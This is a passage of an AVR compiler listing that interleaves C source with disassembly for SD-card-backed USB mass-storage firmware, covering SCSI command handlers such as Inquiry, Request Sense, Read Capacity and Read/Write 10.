    4ac0:	6d 91       	ld	r22, X+
    4ac2:	7c 91       	ld	r23, X
    4ac4:	57 97       	sbiw	r26, 0x17	; 23
    4ac6:	44 50       	subi	r20, 0x04	; 4
    4ac8:	51 09       	sbc	r21, r1
    4aca:	61 09       	sbc	r22, r1
    4acc:	71 09       	sbc	r23, r1
    4ace:	54 96       	adiw	r26, 0x14	; 20
    4ad0:	4d 93       	st	X+, r20
    4ad2:	5d 93       	st	X+, r21
    4ad4:	6d 93       	st	X+, r22
    4ad6:	7c 93       	st	X, r23
    4ad8:	57 97       	sbiw	r26, 0x17	; 23

    return true;
}
    4ada:	81 e0       	ldi	r24, 0x01	; 1
    4adc:	08 95       	ret

00004ade <SCSI_Command_Request_Sense>:
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise.
 */
static bool SCSI_Command_Request_Sense(USB_ClassInfo_MS_Device_t* const
                                       MSInterfaceInfo)
{
    4ade:	ef 92       	push	r14
    4ae0:	ff 92       	push	r15
    4ae2:	0f 93       	push	r16
    4ae4:	1f 93       	push	r17
    4ae6:	cf 93       	push	r28
    4ae8:	df 93       	push	r29
    4aea:	8c 01       	movw	r16, r24
    uint8_t  AllocationLength =
    4aec:	fc 01       	movw	r30, r24
    4aee:	c7 8d       	ldd	r28, Z+31	; 0x1f
        MSInterfaceInfo->State.CommandBlock.SCSICommandData[4];
    uint8_t  BytesTransferred = MIN(AllocationLength, sizeof(SenseData));
    4af0:	dc 2f       	mov	r29, r28
    4af2:	c3 31       	cpi	r28, 0x13	; 19
    4af4:	08 f0       	brcs	.+2      	; 0x4af8 <SCSI_Command_Request_Sense+0x1a>
    4af6:	d2 e1       	ldi	r29, 0x12	; 18

    Endpoint_Write_Stream_LE(&SenseData, BytesTransferred, NULL);
    4af8:	ed 2e       	mov	r14, r29
    4afa:	f1 2c       	mov	r15, r1
    4afc:	40 e0       	ldi	r20, 0x00	; 0
    4afe:	50 e0       	ldi	r21, 0x00	; 0
    4b00:	b7 01       	movw	r22, r14
    4b02:	88 e5       	ldi	r24, 0x58	; 88
    4b04:	91 e0       	ldi	r25, 0x01	; 1
    4b06:	0e 94 03 33 	call	0x6606	; 0x6606 <Endpoint_Write_Stream_LE>
    Endpoint_Null_Stream((AllocationLength - BytesTransferred), NULL);
    4b0a:	8c 2f       	mov	r24, r28
    4b0c:	90 e0       	ldi	r25, 0x00	; 0
    4b0e:	60 e0       	ldi	r22, 0x00	; 0
    4b10:	70 e0       	ldi	r23, 0x00	; 0
    4b12:	8e 19       	sub	r24, r14
    4b14:	9f 09       	sbc	r25, r15
    4b16:	0e 94 c5 32 	call	0x658a	; 0x658a <Endpoint_Null_Stream>
    4b1a:	e8 ee       	ldi	r30, 0xE8	; 232
    4b1c:	f0 e0       	ldi	r31, 0x00	; 0
    4b1e:	80 81       	ld	r24, Z
    4b20:	8e 77       	andi	r24, 0x7E	; 126
    4b22:	80 83       	st	Z, r24
    Endpoint_ClearIN();

    /* Succeed the command and update the bytes transferred counter */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength -= BytesTransferred;
    4b24:	f8 01       	movw	r30, r16
    4b26:	84 89       	ldd	r24, Z+20	; 0x14
    4b28:	95 89       	ldd	r25, Z+21	; 0x15
    4b2a:	a6 89       	ldd	r26, Z+22	; 0x16
    4b2c:	b7 89       	ldd	r27, Z+23	; 0x17
    4b2e:	8d 1b       	sub	r24, r29
    4b30:	91 09       	sbc	r25, r1
    4b32:	a1 09       	sbc	r26, r1
    4b34:	b1 09       	sbc	r27, r1
    4b36:	84 8b       	std	Z+20, r24	; 0x14
    4b38:	95 8b       	std	Z+21, r25	; 0x15
    4b3a:	a6 8b       	std	Z+22, r26	; 0x16
    4b3c:	b7 8b       	std	Z+23, r27	; 0x17

    return true;
}
    4b3e:	81 e0       	ldi	r24, 0x01	; 1
    4b40:	df 91       	pop	r29
    4b42:	cf 91       	pop	r28
    4b44:	1f 91       	pop	r17
    4b46:	0f 91       	pop	r16
    4b48:	ff 90       	pop	r15
    4b4a:	ef 90       	pop	r14
    4b4c:	08 95       	ret

00004b4e <SCSI_Command_Inquiry>:
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise.
 */
static bool SCSI_Command_Inquiry(USB_ClassInfo_MS_Device_t* const
                                 MSInterfaceInfo)
{
    4b4e:	ef 92       	push	r14
    4b50:	ff 92       	push	r15
    4b52:	0f 93       	push	r16
    4b54:	1f 93       	push	r17
    4b56:	cf 93       	push	r28
    4b58:	df 93       	push	r29
    4b5a:	fc 01       	movw	r30, r24
    uint16_t AllocationLength  = SwapEndian_16(*(uint16_t*)
    4b5c:	86 8d       	ldd	r24, Z+30	; 0x1e
    4b5e:	97 8d       	ldd	r25, Z+31	; 0x1f

				Temp = Data.Bytes[0];
				Data.Bytes[0] = Data.Bytes[1];
				Data.Bytes[1] = Temp;

				return Data.Word;
    4b60:	09 2f       	mov	r16, r25
    4b62:	18 2f       	mov	r17, r24
                                 &MSInterfaceInfo->State.CommandBlock.SCSICommandData[3]);
    uint16_t BytesTransferred  = MIN(AllocationLength, sizeof(InquiryData));
    4b64:	78 01       	movw	r14, r16
    4b66:	05 32       	cpi	r16, 0x25	; 37
    4b68:	11 05       	cpc	r17, r1
    4b6a:	28 f0       	brcs	.+10     	; 0x4b76 <SCSI_Command_Inquiry+0x28>
    4b6c:	0f 2e       	mov	r0, r31
    4b6e:	f4 e2       	ldi	r31, 0x24	; 36
    4b70:	ef 2e       	mov	r14, r31
    4b72:	f1 2c       	mov	r15, r1
    4b74:	f0 2d       	mov	r31, r0

    /* Only the standard INQUIRY data is supported, check if any optional INQUIRY bits set */
    if ((MSInterfaceInfo->State.CommandBlock.SCSICommandData[1] & ((1 << 0) |
    4b76:	84 8d       	ldd	r24, Z+28	; 0x1c
    4b78:	83 70       	andi	r24, 0x03	; 3
    4b7a:	19 f4       	brne	.+6      	; 0x4b82 <SCSI_Command_Inquiry+0x34>
            (1 << 1))) ||
            MSInterfaceInfo->State.CommandBlock.SCSICommandData[2])
    4b7c:	85 8d       	ldd	r24, Z+29	; 0x1d
                                 &MSInterfaceInfo->State.CommandBlock.SCSICommandData[3]);
    uint16_t BytesTransferred  = MIN(AllocationLength, sizeof(InquiryData));

    /* Only the standard INQUIRY data is supported, check if any optional INQUIRY bits set */
    if ((MSInterfaceInfo->State.CommandBlock.SCSICommandData[1] & ((1 << 0) |
            (1 << 1))) ||
    4b7e:	88 23       	and	r24, r24
    4b80:	69 f0       	breq	.+26     	; 0x4b9c <SCSI_Command_Inquiry+0x4e>
            MSInterfaceInfo->State.CommandBlock.SCSICommandData[2])
    {
        /* Optional but unsupported bits set - update the SENSE key and fail the request */
        SCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,
    4b82:	ea e5       	ldi	r30, 0x5A	; 90
    4b84:	f1 e0       	ldi	r31, 0x01	; 1
    4b86:	80 81       	ld	r24, Z
    4b88:	80 7f       	andi	r24, 0xF0	; 240
    4b8a:	85 60       	ori	r24, 0x05	; 5
    4b8c:	80 83       	st	Z, r24
    4b8e:	e8 e5       	ldi	r30, 0x58	; 88
    4b90:	f1 e0       	ldi	r31, 0x01	; 1
    4b92:	84 e2       	ldi	r24, 0x24	; 36
    4b94:	84 87       	std	Z+12, r24	; 0x0c
    4b96:	15 86       	std	Z+13, r1	; 0x0d
                       SCSI_ASENSE_INVALID_FIELD_IN_CDB,
                       SCSI_ASENSEQ_NO_QUALIFIER);

        return false;
    4b98:	80 e0       	ldi	r24, 0x00	; 0
    4b9a:	2c c0       	rjmp	.+88     	; 0x4bf4 <SCSI_Command_Inquiry+0xa6>
    4b9c:	ef 01       	movw	r28, r30
    }

    if (NULL != SCSI_DREG_HOOK_VENDORPRODUCT_ID)
    4b9e:	e0 91 06 01 	lds	r30, 0x0106	; 0x800106 <SCSI_DREG_HOOK_VENDORPRODUCT_ID>
    4ba2:	f0 91 07 01 	lds	r31, 0x0107	; 0x800107 <SCSI_DREG_HOOK_VENDORPRODUCT_ID+0x1>
    4ba6:	30 97       	sbiw	r30, 0x00	; 0
    4ba8:	29 f0       	breq	.+10     	; 0x4bb4 <SCSI_Command_Inquiry+0x66>
    {
        SCSI_DREG_HOOK_VENDORPRODUCT_ID((uint8_t*)InquiryData.VendorID,
    4baa:	6a e2       	ldi	r22, 0x2A	; 42
    4bac:	75 e0       	ldi	r23, 0x05	; 5
    4bae:	82 e2       	ldi	r24, 0x22	; 34
    4bb0:	95 e0       	ldi	r25, 0x05	; 5
    4bb2:	09 95       	icall
                                        (uint8_t*)InquiryData.ProductID);
    }

    Endpoint_Write_Stream_LE(&InquiryData, BytesTransferred, NULL);
    4bb4:	40 e0       	ldi	r20, 0x00	; 0
    4bb6:	50 e0       	ldi	r21, 0x00	; 0
    4bb8:	b7 01       	movw	r22, r14
    4bba:	8a e1       	ldi	r24, 0x1A	; 26
    4bbc:	95 e0       	ldi	r25, 0x05	; 5
    4bbe:	0e 94 03 33 	call	0x6606	; 0x6606 <Endpoint_Write_Stream_LE>

    /* Pad out remaining bytes with 0x00 */
    Endpoint_Null_Stream((AllocationLength - BytesTransferred), NULL);
    4bc2:	60 e0       	ldi	r22, 0x00	; 0
    4bc4:	70 e0       	ldi	r23, 0x00	; 0
    4bc6:	c8 01       	movw	r24, r16
    4bc8:	8e 19       	sub	r24, r14
    4bca:	9f 09       	sbc	r25, r15
    4bcc:	0e 94 c5 32 	call	0x658a	; 0x658a <Endpoint_Null_Stream>
    4bd0:	e8 ee       	ldi	r30, 0xE8	; 232
    4bd2:	f0 e0       	ldi	r31, 0x00	; 0
    4bd4:	80 81       	ld	r24, Z
    4bd6:	8e 77       	andi	r24, 0x7E	; 126
    4bd8:	80 83       	st	Z, r24

    /* Finalize the stream transfer to send the last packet */
    Endpoint_ClearIN();

    /* Succeed the command and update the bytes transferred counter */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength -= BytesTransferred;
    4bda:	8c 89       	ldd	r24, Y+20	; 0x14
    4bdc:	9d 89       	ldd	r25, Y+21	; 0x15
    4bde:	ae 89       	ldd	r26, Y+22	; 0x16
    4be0:	bf 89       	ldd	r27, Y+23	; 0x17
    4be2:	8e 19       	sub	r24, r14
    4be4:	9f 09       	sbc	r25, r15
    4be6:	a1 09       	sbc	r26, r1
    4be8:	b1 09       	sbc	r27, r1
    4bea:	8c 8b       	std	Y+20, r24	; 0x14
    4bec:	9d 8b       	std	Y+21, r25	; 0x15
    4bee:	ae 8b       	std	Y+22, r26	; 0x16
    4bf0:	bf 8b       	std	Y+23, r27	; 0x17

    return true;
    4bf2:	81 e0       	ldi	r24, 0x01	; 1
}
    4bf4:	df 91       	pop	r29
    4bf6:	cf 91       	pop	r28
    4bf8:	1f 91       	pop	r17
    4bfa:	0f 91       	pop	r16
    4bfc:	ff 90       	pop	r15
    4bfe:	ef 90       	pop	r14
    4c00:	08 95       	ret

00004c02 <SCSI_Command_Read_Capacity_10>:
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise.
 */
static bool SCSI_Command_Read_Capacity_10(USB_ClassInfo_MS_Device_t* const
        MSInterfaceInfo)
{
    4c02:	0f 93       	push	r16
    4c04:	1f 93       	push	r17
    4c06:	cf 93       	push	r28
    4c08:	df 93       	push	r29
    4c0a:	cd b7       	in	r28, 0x3d	; 61
    4c0c:	de b7       	in	r29, 0x3e	; 62
    4c0e:	28 97       	sbiw	r28, 0x08	; 8
    4c10:	0f b6       	in	r0, 0x3f	; 63
    4c12:	f8 94       	cli
    4c14:	de bf       	out	0x3e, r29	; 62
    4c16:	0f be       	out	0x3f, r0	; 63
    4c18:	cd bf       	out	0x3d, r28	; 61
    4c1a:	8c 01       	movw	r16, r24
    uint32_t LastBlockAddressInLUN = (LUN_MEDIA_BLOCKS - 1);
    4c1c:	7b d3       	rcall	.+1782   	; 0x5314 <sdcard_GetNbBlocks>
    4c1e:	dc 01       	movw	r26, r24
    4c20:	cb 01       	movw	r24, r22
    4c22:	01 97       	sbiw	r24, 0x01	; 1
    4c24:	a1 09       	sbc	r26, r1
    4c26:	b1 09       	sbc	r27, r1
    4c28:	89 83       	std	Y+1, r24	; 0x01
    4c2a:	9a 83       	std	Y+2, r25	; 0x02
    4c2c:	ab 83       	std	Y+3, r26	; 0x03
    4c2e:	bc 83       	std	Y+4, r27	; 0x04
    uint32_t MediaBlockSize        = VIRTUAL_MEMORY_BLOCK_SIZE;
    4c30:	80 e0       	ldi	r24, 0x00	; 0
    4c32:	92 e0       	ldi	r25, 0x02	; 2
    4c34:	a0 e0       	ldi	r26, 0x00	; 0
    4c36:	b0 e0       	ldi	r27, 0x00	; 0
    4c38:	8d 83       	std	Y+5, r24	; 0x05
    4c3a:	9e 83       	std	Y+6, r25	; 0x06
    4c3c:	af 83       	std	Y+7, r26	; 0x07
    4c3e:	b8 87       	std	Y+8, r27	; 0x08

    Endpoint_Write_Stream_BE(&LastBlockAddressInLUN, sizeof(LastBlockAddressInLUN),
    4c40:	40 e0       	ldi	r20, 0x00	; 0
    4c42:	50 e0       	ldi	r21, 0x00	; 0
    4c44:	64 e0       	ldi	r22, 0x04	; 4
    4c46:	70 e0       	ldi	r23, 0x00	; 0
    4c48:	ce 01       	movw	r24, r28
    4c4a:	01 96       	adiw	r24, 0x01	; 1
    4c4c:	0e 94 4c 33 	call	0x6698	; 0x6698 <Endpoint_Write_Stream_BE>
                             NULL);
    Endpoint_Write_Stream_BE(&MediaBlockSize, sizeof(MediaBlockSize), NULL);
    4c50:	40 e0       	ldi	r20, 0x00	; 0
    4c52:	50 e0       	ldi	r21, 0x00	; 0
    4c54:	64 e0       	ldi	r22, 0x04	; 4
    4c56:	70 e0       	ldi	r23, 0x00	; 0
    4c58:	ce 01       	movw	r24, r28
    4c5a:	05 96       	adiw	r24, 0x05	; 5
    4c5c:	0e 94 4c 33 	call	0x6698	; 0x6698 <Endpoint_Write_Stream_BE>
    4c60:	e8 ee       	ldi	r30, 0xE8	; 232
    4c62:	f0 e0       	ldi	r31, 0x00	; 0
    4c64:	80 81       	ld	r24, Z
    4c66:	8e 77       	andi	r24, 0x7E	; 126
    4c68:	80 83       	st	Z, r24
    Endpoint_ClearIN();

    /* Succeed the command and update the bytes transferred counter */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength -= 8;
    4c6a:	f8 01       	movw	r30, r16
    4c6c:	84 89       	ldd	r24, Z+20	; 0x14
    4c6e:	95 89       	ldd	r25, Z+21	; 0x15
    4c70:	a6 89       	ldd	r26, Z+22	; 0x16
    4c72:	b7 89       	ldd	r27, Z+23	; 0x17
    4c74:	08 97       	sbiw	r24, 0x08	; 8
    4c76:	a1 09       	sbc	r26, r1
    4c78:	b1 09       	sbc	r27, r1
    4c7a:	84 8b       	std	Z+20, r24	; 0x14
    4c7c:	95 8b       	std	Z+21, r25	; 0x15
    4c7e:	a6 8b       	std	Z+22, r26	; 0x16
    4c80:	b7 8b       	std	Z+23, r27	; 0x17

    return true;
}
    4c82:	81 e0       	ldi	r24, 0x01	; 1
    4c84:	28 96       	adiw	r28, 0x08	; 8
    4c86:	0f b6       	in	r0, 0x3f	; 63
    4c88:	f8 94       	cli
    4c8a:	de bf       	out	0x3e, r29	; 62
    4c8c:	0f be       	out	0x3f, r0	; 63
    4c8e:	cd bf       	out	0x3d, r28	; 61
    4c90:	df 91       	pop	r29
    4c92:	cf 91       	pop	r28
    4c94:	1f 91       	pop	r17
    4c96:	0f 91       	pop	r16
    4c98:	08 95       	ret

00004c9a <SCSI_Command_Send_Diagnostic>:
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise.
 */
static bool SCSI_Command_Send_Diagnostic(USB_ClassInfo_MS_Device_t* const
        MSInterfaceInfo)
{
    4c9a:	cf 93       	push	r28
    4c9c:	df 93       	push	r29
    /* Check to see if the SELF TEST bit is not set */
    if (!(MSInterfaceInfo->State.CommandBlock.SCSICommandData[1] & (1 << 2)))
    4c9e:	fc 01       	movw	r30, r24
    4ca0:	24 8d       	ldd	r18, Z+28	; 0x1c
    4ca2:	22 fd       	sbrc	r18, 2
    4ca4:	0d c0       	rjmp	.+26     	; 0x4cc0 <SCSI_Command_Send_Diagnostic+0x26>
    {
        /* Only self-test supported - update SENSE key and fail the command */
        SCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,
    4ca6:	ea e5       	ldi	r30, 0x5A	; 90
    4ca8:	f1 e0       	ldi	r31, 0x01	; 1
    4caa:	80 81       	ld	r24, Z
    4cac:	80 7f       	andi	r24, 0xF0	; 240
    4cae:	85 60       	ori	r24, 0x05	; 5
    4cb0:	80 83       	st	Z, r24
    4cb2:	e8 e5       	ldi	r30, 0x58	; 88
    4cb4:	f1 e0       	ldi	r31, 0x01	; 1
    4cb6:	84 e2       	ldi	r24, 0x24	; 36
    4cb8:	84 87       	std	Z+12, r24	; 0x0c
    4cba:	15 86       	std	Z+13, r1	; 0x0d
                       SCSI_ASENSE_INVALID_FIELD_IN_CDB,
                       SCSI_ASENSEQ_NO_QUALIFIER);

        return false;
    4cbc:	80 e0       	ldi	r24, 0x00	; 0
    4cbe:	14 c0       	rjmp	.+40     	; 0x4ce8 <SCSI_Command_Send_Diagnostic+0x4e>
    4cc0:	ec 01       	movw	r28, r24
    }

    /* Check to see if all attached Dataflash ICs are functional */
    if (!(sdcard_CheckDataflashOperation()))
    4cc2:	0e 94 b9 2e 	call	0x5d72	; 0x5d72 <sdcard_CheckDataflashOperation>
    4cc6:	81 11       	cpse	r24, r1
    4cc8:	0b c0       	rjmp	.+22     	; 0x4ce0 <SCSI_Command_Send_Diagnostic+0x46>
    {
        /* Update SENSE key with a hardware error condition and return command fail */
        SCSI_SET_SENSE(SCSI_SENSE_KEY_HARDWARE_ERROR,
    4cca:	ea e5       	ldi	r30, 0x5A	; 90
    4ccc:	f1 e0       	ldi	r31, 0x01	; 1
    4cce:	90 81       	ld	r25, Z
    4cd0:	90 7f       	andi	r25, 0xF0	; 240
    4cd2:	94 60       	ori	r25, 0x04	; 4
    4cd4:	90 83       	st	Z, r25
    4cd6:	e8 e5       	ldi	r30, 0x58	; 88
    4cd8:	f1 e0       	ldi	r31, 0x01	; 1
    4cda:	14 86       	std	Z+12, r1	; 0x0c
    4cdc:	15 86       	std	Z+13, r1	; 0x0d
                       SCSI_ASENSE_NO_ADDITIONAL_INFORMATION,
                       SCSI_ASENSEQ_NO_QUALIFIER);

        return false;
    4cde:	04 c0       	rjmp	.+8      	; 0x4ce8 <SCSI_Command_Send_Diagnostic+0x4e>
    }

    /* Succeed the command and update the bytes transferred counter */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength = 0;
    4ce0:	1c 8a       	std	Y+20, r1	; 0x14
    4ce2:	1d 8a       	std	Y+21, r1	; 0x15
    4ce4:	1e 8a       	std	Y+22, r1	; 0x16
    4ce6:	1f 8a       	std	Y+23, r1	; 0x17

    return true;
}
    4ce8:	df 91       	pop	r29
    4cea:	cf 91       	pop	r28
    4cec:	08 95       	ret

00004cee <SCSI_Command_ReadWrite_10>:
 *  \return Boolean \c true if the command completed successfully, \c false otherwise.
 */
static bool SCSI_Command_ReadWrite_10(USB_ClassInfo_MS_Device_t* const
                                      MSInterfaceInfo,
                                      const bool IsDataRead)
{
    4cee:	bf 92       	push	r11
    4cf0:	cf 92       	push	r12
    4cf2:	df 92       	push	r13
    4cf4:	ef 92       	push	r14
    4cf6:	ff 92       	push	r15
    4cf8:	0f 93       	push	r16
    4cfa:	1f 93       	push	r17
    4cfc:	cf 93       	push	r28
    4cfe:	df 93       	push	r29
    4d00:	ec 01       	movw	r28, r24
    4d02:	b6 2e       	mov	r11, r22

        return false;
    }

    /* Load in the 32-bit block address (SCSI uses big-endian, so have to reverse the byte order) */
    BlockAddress = SwapEndian_32(*(uint32_t*)
    4d04:	8d 8d       	ldd	r24, Y+29	; 0x1d
    4d06:	9e 8d       	ldd	r25, Y+30	; 0x1e
    4d08:	2f 8d       	ldd	r18, Y+31	; 0x1f
    4d0a:	38 a1       	ldd	r19, Y+32	; 0x20

				Temp = Data.Bytes[1];
				Data.Bytes[1] = Data.Bytes[2];
				Data.Bytes[2] = Temp;

				return Data.DWord;
    4d0c:	c3 2e       	mov	r12, r19
    4d0e:	d2 2e       	mov	r13, r18
    4d10:	e9 2e       	mov	r14, r25
    4d12:	f8 2e       	mov	r15, r24
                                 &MSInterfaceInfo->State.CommandBlock.SCSICommandData[2]);

    /* Load in the 16-bit total blocks (SCSI uses big-endian, so have to reverse the byte order) */
    TotalBlocks  = SwapEndian_16(*(uint16_t*)
    4d14:	8a a1       	ldd	r24, Y+34	; 0x22
    4d16:	9b a1       	ldd	r25, Y+35	; 0x23

				Temp = Data.Bytes[0];
				Data.Bytes[0] = Data.Bytes[1];
				Data.Bytes[1] = Temp;

				return Data.Word;
    4d18:	09 2f       	mov	r16, r25
    4d1a:	18 2f       	mov	r17, r24
                                 &MSInterfaceInfo->State.CommandBlock.SCSICommandData[7]);

    /* Check if the block address is outside the maximum allowable value for the LUN */
    if (BlockAddress >= LUN_MEDIA_BLOCKS)
    4d1c:	fb d2       	rcall	.+1526   	; 0x5314 <sdcard_GetNbBlocks>
    4d1e:	c6 16       	cp	r12, r22
    4d20:	d7 06       	cpc	r13, r23
    4d22:	e8 06       	cpc	r14, r24
    4d24:	f9 06       	cpc	r15, r25
    4d26:	68 f0       	brcs	.+26     	; 0x4d42 <SCSI_Command_ReadWrite_10+0x54>
    {
        /* Block address is invalid, update SENSE key and return command fail */
        SCSI_SET_SENSE(SCSI_SENSE_KEY_ILLEGAL_REQUEST,
    4d28:	ea e5       	ldi	r30, 0x5A	; 90
    4d2a:	f1 e0       	ldi	r31, 0x01	; 1
    4d2c:	80 81       	ld	r24, Z
    4d2e:	80 7f       	andi	r24, 0xF0	; 240
    4d30:	85 60       	ori	r24, 0x05	; 5
    4d32:	80 83       	st	Z, r24
    4d34:	e8 e5       	ldi	r30, 0x58	; 88
    4d36:	f1 e0       	ldi	r31, 0x01	; 1
    4d38:	81 e2       	ldi	r24, 0x21	; 33
    4d3a:	84 87       	std	Z+12, r24	; 0x0c
    4d3c:	15 86       	std	Z+13, r1	; 0x0d
                       SCSI_ASENSE_LOGICAL_BLOCK_ADDRESS_OUT_OF_RANGE,
                       SCSI_ASENSEQ_NO_QUALIFIER);

        return false;
    4d3e:	80 e0       	ldi	r24, 0x00	; 0
    4d40:	28 c0       	rjmp	.+80     	; 0x4d92 <SCSI_Command_ReadWrite_10+0xa4>
    BlockAddress += ((uint32_t)MSInterfaceInfo->State.CommandBlock.LUN *
                     LUN_MEDIA_BLOCKS);
#endif

    /* Determine if the packet is a READ (10) or WRITE (10) command, call appropriate function */
    if (IsDataRead == DATA_READ)
    4d42:	bb 20       	and	r11, r11
    4d44:	31 f0       	breq	.+12     	; 0x4d52 <SCSI_Command_ReadWrite_10+0x64>
    {
        sdcard_ReadBlocks(MSInterfaceInfo, BlockAddress, TotalBlocks);
    4d46:	98 01       	movw	r18, r16
    4d48:	b7 01       	movw	r22, r14
    4d4a:	a6 01       	movw	r20, r12
    4d4c:	ce 01       	movw	r24, r28
    4d4e:	c9 d5       	rcall	.+2962   	; 0x58e2 <sdcard_ReadBlocks>
    4d50:	05 c0       	rjmp	.+10     	; 0x4d5c <SCSI_Command_ReadWrite_10+0x6e>
    }
    else
    {
        sdcard_WriteBlocks(MSInterfaceInfo, BlockAddress, TotalBlocks);
    4d52:	98 01       	movw	r18, r16
    4d54:	b7 01       	movw	r22, r14
    4d56:	a6 01       	movw	r20, r12
    4d58:	ce 01       	movw	r24, r28
    4d5a:	bf d3       	rcall	.+1918   	; 0x54da <sdcard_WriteBlocks>
    }

    /* Update the bytes transferred counter and succeed the command */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength -= ((
    4d5c:	c8 01       	movw	r24, r16
    4d5e:	a0 e0       	ldi	r26, 0x00	; 0
    4d60:	b0 e0       	ldi	r27, 0x00	; 0
                uint32_t)TotalBlocks * VIRTUAL_MEMORY_BLOCK_SIZE);
    4d62:	07 2e       	mov	r0, r23
    4d64:	79 e0       	ldi	r23, 0x09	; 9
    4d66:	88 0f       	add	r24, r24
    4d68:	99 1f       	adc	r25, r25
    4d6a:	aa 1f       	adc	r26, r26
    4d6c:	bb 1f       	adc	r27, r27
    4d6e:	7a 95       	dec	r23
    4d70:	d1 f7       	brne	.-12     	; 0x4d66 <SCSI_Command_ReadWrite_10+0x78>
    4d72:	70 2d       	mov	r23, r0
    {
        sdcard_WriteBlocks(MSInterfaceInfo, BlockAddress, TotalBlocks);
    }

    /* Update the bytes transferred counter and succeed the command */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength -= ((
    4d74:	4c 89       	ldd	r20, Y+20	; 0x14
    4d76:	5d 89       	ldd	r21, Y+21	; 0x15
    4d78:	6e 89       	ldd	r22, Y+22	; 0x16
    4d7a:	7f 89       	ldd	r23, Y+23	; 0x17
    4d7c:	8a 01       	movw	r16, r20
    4d7e:	9b 01       	movw	r18, r22
    4d80:	08 1b       	sub	r16, r24
    4d82:	19 0b       	sbc	r17, r25
    4d84:	2a 0b       	sbc	r18, r26
    4d86:	3b 0b       	sbc	r19, r27
    4d88:	0c 8b       	std	Y+20, r16	; 0x14
    4d8a:	1d 8b       	std	Y+21, r17	; 0x15
    4d8c:	2e 8b       	std	Y+22, r18	; 0x16
    4d8e:	3f 8b       	std	Y+23, r19	; 0x17
                uint32_t)TotalBlocks * VIRTUAL_MEMORY_BLOCK_SIZE);

    return true;
    4d90:	81 e0       	ldi	r24, 0x01	; 1
}
    4d92:	df 91       	pop	r29
    4d94:	cf 91       	pop	r28
    4d96:	1f 91       	pop	r17
    4d98:	0f 91       	pop	r16
    4d9a:	ff 90       	pop	r15
    4d9c:	ef 90       	pop	r14
    4d9e:	df 90       	pop	r13
    4da0:	cf 90       	pop	r12
    4da2:	bf 90       	pop	r11
    4da4:	08 95       	ret

00004da6 <SCSI_DecodeSCSICommand>:
 *  \param[in] MSInterfaceInfo  Pointer to the Mass Storage class interface structure that the command is associated with
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise
 */
bool SCSI_DecodeSCSICommand(USB_ClassInfo_MS_Device_t* const MSInterfaceInfo)
{
    4da6:	fc 01       	movw	r30, r24
    bool CommandSuccess = false;

    /* Run the appropriate SCSI command hander function based on the passed command */
    switch (MSInterfaceInfo->State.CommandBlock.SCSICommandData[0])
    4da8:	93 8d       	ldd	r25, Z+27	; 0x1b
    4daa:	9d 31       	cpi	r25, 0x1D	; 29
    4dac:	21 f1       	breq	.+72     	; 0x4df6 <SCSI_DecodeSCSICommand+0x50>
    4dae:	68 f4       	brcc	.+26     	; 0x4dca <SCSI_DecodeSCSICommand+0x24>
    4db0:	92 31       	cpi	r25, 0x12	; 18
    4db2:	c1 f0       	breq	.+48     	; 0x4de4 <SCSI_DecodeSCSICommand+0x3e>
    4db4:	28 f4       	brcc	.+10     	; 0x4dc0 <SCSI_DecodeSCSICommand+0x1a>
    4db6:	99 23       	and	r25, r25
    4db8:	61 f1       	breq	.+88     	; 0x4e12 <SCSI_DecodeSCSICommand+0x6c>
    4dba:	93 30       	cpi	r25, 0x03	; 3
    4dbc:	b1 f0       	breq	.+44     	; 0x4dea <SCSI_DecodeSCSICommand+0x44>
    4dbe:	2f c0       	rjmp	.+94     	; 0x4e1e <SCSI_DecodeSCSICommand+0x78>
    4dc0:	9a 31       	cpi	r25, 0x1A	; 26
    4dc2:	21 f1       	breq	.+72     	; 0x4e0c <SCSI_DecodeSCSICommand+0x66>
    4dc4:	9b 31       	cpi	r25, 0x1B	; 27
    4dc6:	29 f1       	breq	.+74     	; 0x4e12 <SCSI_DecodeSCSICommand+0x6c>
    4dc8:	2a c0       	rjmp	.+84     	; 0x4e1e <SCSI_DecodeSCSICommand+0x78>
    4dca:	98 32       	cpi	r25, 0x28	; 40
    4dcc:	d9 f0       	breq	.+54     	; 0x4e04 <SCSI_DecodeSCSICommand+0x5e>
    4dce:	28 f4       	brcc	.+10     	; 0x4dda <SCSI_DecodeSCSICommand+0x34>
    4dd0:	9e 31       	cpi	r25, 0x1E	; 30
    4dd2:	f9 f0       	breq	.+62     	; 0x4e12 <SCSI_DecodeSCSICommand+0x6c>
    4dd4:	95 32       	cpi	r25, 0x25	; 37
    4dd6:	61 f0       	breq	.+24     	; 0x4df0 <SCSI_DecodeSCSICommand+0x4a>
    4dd8:	22 c0       	rjmp	.+68     	; 0x4e1e <SCSI_DecodeSCSICommand+0x78>
    4dda:	9a 32       	cpi	r25, 0x2A	; 42
    4ddc:	79 f0       	breq	.+30     	; 0x4dfc <SCSI_DecodeSCSICommand+0x56>
    4dde:	9f 32       	cpi	r25, 0x2F	; 47
    4de0:	c1 f0       	breq	.+48     	; 0x4e12 <SCSI_DecodeSCSICommand+0x6c>
    4de2:	1d c0       	rjmp	.+58     	; 0x4e1e <SCSI_DecodeSCSICommand+0x78>
    {
        case SCSI_CMD_INQUIRY:
            CommandSuccess = SCSI_Command_Inquiry(MSInterfaceInfo);
    4de4:	cf 01       	movw	r24, r30
    4de6:	b3 de       	rcall	.-666    	; 0x4b4e <SCSI_Command_Inquiry>
            break;
    4de8:	26 c0       	rjmp	.+76     	; 0x4e36 <SCSI_DecodeSCSICommand+0x90>
        case SCSI_CMD_REQUEST_SENSE:
            CommandSuccess = SCSI_Command_Request_Sense(MSInterfaceInfo);
    4dea:	cf 01       	movw	r24, r30
    4dec:	78 de       	rcall	.-784    	; 0x4ade <SCSI_Command_Request_Sense>
            break;
        case SCSI_CMD_READ_CAPACITY_10:
            CommandSuccess = SCSI_Command_Read_Capacity_10(MSInterfaceInfo);
